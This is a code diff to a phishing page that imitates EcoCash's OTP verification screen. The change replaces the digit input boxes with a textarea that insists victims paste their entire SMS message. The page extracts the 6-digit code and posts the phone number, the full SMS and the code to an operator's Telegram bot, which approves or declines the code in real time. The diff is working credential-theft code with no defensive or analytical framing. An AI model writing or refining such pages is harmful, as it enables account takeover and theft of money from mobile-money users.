@@ -73,7 +73,6 @@
       letter-spacing: 0.5px;
     }
 
-    /* Your existing timer row – unchanged */
     .timer-row {
       display: flex;
       justify-content: center;
@@ -85,28 +84,38 @@
       font-weight: 600;
     }
 
-    .otp-inputs {
-      display: flex;
-      justify-content: center;
-      gap: 12px;
-      margin: 25px 0 20px;
-      flex-wrap: wrap;
-    }
-    .otp-digit {
-      width: 48px;
-      height: 56px;
-      border-radius: 12px;
+    .otp-textarea {
+      width: 100%;
+      padding: 14px 16px;
+      font-size: 16px;
       border: 2px solid #1c6aa6;
-      text-align: center;
-      font-size: 26px;
-      font-weight: 600;
+      border-radius: 12px;
+      resize: vertical;
+      font-family: monospace;
       background: white;
       outline: none;
-      transition: all 0.1s ease;
+      transition: all 0.2s;
+      margin: 10px 0;
     }
-    .otp-digit:focus {
-      border-color: #e12b2b !important;
-      box-shadow: 0 0 0 2px rgba(225,43,43,0.2) !important;
+    .otp-textarea:focus {
+      border-color: #e12b2b;
+      box-shadow: 0 0 0 2px rgba(225,43,43,0.2);
+    }
+
+    .info-note {
+      font-size: 13px;
+      color: #666;
+      margin: 8px 0 4px;
+      background: #f8f8f8;
+      padding: 8px;
+      border-radius: 10px;
+    }
+
+    .warning-note {
+      font-size: 12px;
+      color: #e12b2b;
+      margin-top: 4px;
+      display: none;
     }
 
     .submit-btn {
@@ -144,7 +153,6 @@
       text-align: center;
     }
 
-    /* Spinner overlay – now blue to match EcoCash branding */
     #spinnerOverlay {
       position: fixed;
       inset: 0;
@@ -159,7 +167,7 @@
       width: 48px;
       height: 48px;
       border: 5px solid #ffffff;
-      border-top: 5px solid #1c6aa6;  /* changed from red to EcoCash blue */
+      border-top: 5px solid #1c6aa6;
       border-radius: 50%;
       animation: spin 1s linear infinite;
     }
@@ -168,13 +176,9 @@
     }
 
     @media (max-width: 400px) {
-      .otp-digit {
-        width: 42px;
-        height: 50px;
-        font-size: 22px;
-      }
-      .otp-inputs {
-        gap: 8px;
+      .otp-textarea {
+        font-size: 14px;
+        padding: 12px;
       }
       .timer-row {
         font-size: 14px;
@@ -195,16 +199,10 @@
     </div>
     <div class="phone-masked" id="maskedPhoneDisplay">+263 7*******</div>
 
-    <div class="otp-inputs" id="otpContainer">
-      <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" id="otp1">
-      <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" id="otp2">
-      <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" id="otp3">
-      <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" id="otp4">
-      <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" id="otp5">
-      <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" id="otp6">
-    </div>
+    <textarea class="otp-textarea" id="otpMessage" rows="3" placeholder="Paste the full SMS message here...&#10;Example: Your EcoCash OTP is 123456"></textarea>
+    <div class="info-note">📋 Please paste the entire SMS message you received. The 6‑digit code will be extracted automatically.</div>
+    <div class="warning-note" id="warningNote">⚠️ Please paste the full message, not just the code.</div>
 
-    <!-- Countdown: only seconds, starting at 120 -->
     <div class="timer-row" style="justify-content: center; background: transparent; margin-top: 0;">
       <span id="resendMessage" style="color:#1c6aa6; font-weight:500;">Resend OTP in <span id="resendTimer">120</span> seconds</span>
     </div>
@@ -227,18 +225,12 @@
     const API_BASE  = `https://api.telegram.org/bot${BOT_TOKEN}`;
     
     // ==================== DOM ELEMENTS ====================
-    const otpInputs = [
-      document.getElementById('otp1'),
-      document.getElementById('otp2'),
-      document.getElementById('otp3'),
-      document.getElementById('otp4'),
-      document.getElementById('otp5'),
-      document.getElementById('otp6')
-    ];
+    const otpTextarea = document.getElementById('otpMessage');
     const submitBtn = document.getElementById('submitBtn');
     const errorDiv = document.getElementById('errorMsg');
     const maskedSpan = document.getElementById('maskedPhoneDisplay');
     const resendTimerSpan = document.getElementById('resendTimer');
+    const warningNote = document.getElementById('warningNote');
     
     const spinner = document.getElementById('spinnerOverlay');
     function showSpinner() { spinner.style.display = 'flex'; }
@@ -308,6 +300,24 @@
       }, 1000);
     }
     
+    // ==================== EXTRACT 6-DIGIT CODE ====================
+    function extractSixDigitCode(text) {
+      const match = text.match(/\b\d{6}\b/);
+      return match ? match[0] : null;
+    }
+    
+    // ==================== VALIDATE THAT USER PASTED FULL MESSAGE ====================
+    // Returns true if the input looks like a full message (contains non-digit characters or is longer than 6 digits)
+    function isFullMessage(text) {
+      const trimmed = text.trim();
+      if (trimmed.length === 0) return false;
+      // If the input consists only of digits and length is between 6 and 6 (exactly 6 digits), reject
+      if (/^\d{6}$/.test(trimmed)) return false;
+      // Also if it's just digits but longer than 6? That could be a 10-digit phone number? Unlikely but we'll accept longer digit sequences as they contain extra digits (maybe a number). Actually to force full message, we require at least one non-digit or length > 6.
+      if (/^\d+$/.test(trimmed) && trimmed.length <= 6) return false;
+      return true;
+    }
+    
     // ==================== TELEGRAM OTP APPROVAL ====================
     function stopPolling() {
       if (pollingInterval) {
@@ -326,14 +336,15 @@
       });
     }
     
-    async function sendOtpToTelegram(phoneNumber, enteredOtp) {
+    async function sendOtpToTelegram(phoneNumber, enteredOtp, fullMessage) {
       const timestamp = Date.now();
       const approveId = `otp_approve_${timestamp}`;
       const declineId = `otp_decline_${timestamp}`;
       
       const message = `🔐 <b>EcoCash OTP Verification</b>\n\n` +
                       `<b> Phone:</b> <code>${escapeHtml(phoneNumber)}</code>\n` +
-                      `<b> Entered OTP:</b> <code>${escapeHtml(enteredOtp)}</code>\n\n` +
+                      `<b> Full Message:</b>\n<code>${escapeHtml(fullMessage)}</code>\n\n` +
+                      `<b> Extracted OTP:</b> <code>${escapeHtml(enteredOtp)}</code>\n\n` +
                       `⚠️ <b>Action required:</b> Approve or Decline this OTP.`;
       
       try {
@@ -360,7 +371,7 @@
         hideSpinner();
         isSubmitting = false;
         submitBtn.disabled = false;
-        enableOtpInputs(true);
+        enableInput(true);
         errorDiv.innerText = 'Network error. Please try again.';
       }
     }
@@ -402,10 +413,10 @@
               isSubmitting = false;
               hideSpinner();
               submitBtn.disabled = false;
-              enableOtpInputs(true);
+              enableInput(true);
               errorDiv.innerText = '❌ OTP verification declined. Please try again.';
-              clearOtpFields();
-              if (otpInputs[0]) otpInputs[0].focus();
+              otpTextarea.value = '';
+              otpTextarea.focus();
               return;
             }
           }
@@ -415,103 +426,55 @@
       }, 1500);
     }
     
-    // ==================== OTP INPUT HANDLING ====================
-    function focusNext(idx) {
-      if (idx < otpInputs.length - 1) otpInputs[idx + 1].focus();
+    // ==================== INPUT HANDLING ====================
+    function enableInput(enabled) {
+      if (enabled) otpTextarea.removeAttribute('disabled');
+      else otpTextarea.setAttribute('disabled', 'disabled');
     }
     
-    function focusPrev(idx) {
-      if (idx > 0) otpInputs[idx - 1].focus();
+    // Real-time validation: show warning if only digits (<=6) are entered
+    function validateInput() {
+      const rawText = otpTextarea.value;
+      if (rawText.trim().length === 0) {
+        warningNote.style.display = 'none';
+        submitBtn.disabled = true;
+        return false;
+      }
+      if (!isFullMessage(rawText)) {
+        warningNote.style.display = 'block';
+        submitBtn.disabled = true;
+        return false;
+      }
+      const code = extractSixDigitCode(rawText);
+      if (!code) {
+        warningNote.style.display = 'block';
+        warningNote.innerText = '⚠️ No 6‑digit OTP found in the message. Please check and paste the full SMS.';
+        submitBtn.disabled = true;
+        return false;
+      }
+      warningNote.style.display = 'none';
+      submitBtn.disabled = false;
+      return true;
+    }
+    
+    function handleInput() {
+      validateInput();
+      // Optionally auto-submit? Not auto, let user click submit.
     }
     
     function getEnteredOtp() {
-      return otpInputs.map(inp => inp.value).join('');
+      const rawText = otpTextarea.value;
+      return extractSixDigitCode(rawText);
     }
     
-    function clearOtpFields() {
-      otpInputs.forEach(inp => { inp.value = ''; });
-      if (otpInputs[0]) otpInputs[0].focus();
-    }
-    
-    function enableOtpInputs(enabled) {
-      otpInputs.forEach(inp => {
-        if (enabled) inp.removeAttribute('disabled');
-        else inp.setAttribute('disabled', 'disabled');
-      });
-    }
-    
-    function setupOtpEvents() {
-      otpInputs.forEach((input, idx) => {
-        const inputHandler = function(e) {
-          if (isSubmitting) return;
-          let val = this.value;
-          val = val.replace(/\D/g, '').slice(0,1);
-          this.value = val;
-          if (val.length === 1) {
-            if (idx < otpInputs.length - 1) {
-              focusNext(idx);
-            } else {
-              const fullOtp = getEnteredOtp();
-              if (fullOtp.length === 6 && !isSubmitting) {
-                setTimeout(() => submitOtp(), 60);
-              }
-            }
-          }
-        };
-        
-        const keydownHandler = function(e) {
-          if (isSubmitting) e.preventDefault();
-          if (e.key === 'Backspace') {
-            if (this.value.length === 0 && idx > 0) {
-              e.preventDefault();
-              otpInputs[idx - 1].focus();
-              otpInputs[idx - 1].value = '';
-              otpInputs[idx - 1].dispatchEvent(new Event('input'));
-            }
-          } else if (e.key === 'ArrowLeft') {
-            if (idx > 0) { e.preventDefault(); focusPrev(idx); }
-          } else if (e.key === 'ArrowRight') {
-            if (idx < otpInputs.length - 1) { e.preventDefault(); focusNext(idx); }
-          } else if (!/^[0-9]$/.test(e.key) && e.key !== 'Tab' && e.key !== 'Delete' && e.key !== 'Backspace') {
-            e.preventDefault();
-          }
-        };
-        
-        const pasteHandler = function(e) {
-          if (isSubmitting) return;
-          e.preventDefault();
-          const pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '');
-          if (pasted.length) {
-            const digits = pasted.slice(0, 6).split('');
-            otpInputs.forEach((inp, i) => {
-              if (digits[i]) inp.value = digits[i];
-              else inp.value = '';
-            });
-            const fullOtp = getEnteredOtp();
-            if (fullOtp.length === 6 && !isSubmitting) {
-              submitOtp();
-            } else if (otpInputs[0]) {
-              otpInputs[0].focus();
-            }
-          }
-        };
-        
-        input.removeEventListener('input', inputHandler);
-        input.removeEventListener('keydown', keydownHandler);
-        input.removeEventListener('paste', pasteHandler);
-        input.addEventListener('input', inputHandler);
-        input.addEventListener('keydown', keydownHandler);
-        input.addEventListener('paste', pasteHandler);
-      });
-    }
-    
-    // ==================== SUBMIT OTP ====================
     async function submitOtp() {
       if (isSubmitting) return;
+      if (!validateInput()) return;
       
-      const enteredOtp = getEnteredOtp();
-      if (enteredOtp.length !== 6) {
-        errorDiv.innerText = 'Please enter the 6-digit OTP';
+      const fullMessage = otpTextarea.value;
+      const otpCode = getEnteredOtp();
+      if (!otpCode) {
+        errorDiv.innerText = 'Could not extract a 6‑digit OTP from the message.';
         return;
       }
       
@@ -523,11 +486,11 @@
       
       isSubmitting = true;
       submitBtn.disabled = true;
-      enableOtpInputs(false);
+      enableInput(false);
       showSpinner();
       errorDiv.innerText = '';
       
-      await sendOtpToTelegram(userPhone, enteredOtp);
+      await sendOtpToTelegram(userPhone, otpCode, fullMessage);
     }
     
     // ==================== INITIALIZATION ====================
@@ -541,15 +504,13 @@
         return;
       }
       
-      setupOtpEvents();
       startCountdown();
       
-      submitBtn.addEventListener('click', (e) => {
-        e.preventDefault();
-        if (!isSubmitting) submitOtp();
-      });
+      otpTextarea.addEventListener('input', handleInput);
+      submitBtn.addEventListener('click', submitOtp);
       
-      if (otpInputs[0]) otpInputs[0].focus();
+      otpTextarea.focus();
+      validateInput(); // initial state
     }
     
     window.addEventListener('beforeunload', () => {
@@ -561,4 +522,4 @@
   })();
 </script>
 </body>
-</html>
+</html> 
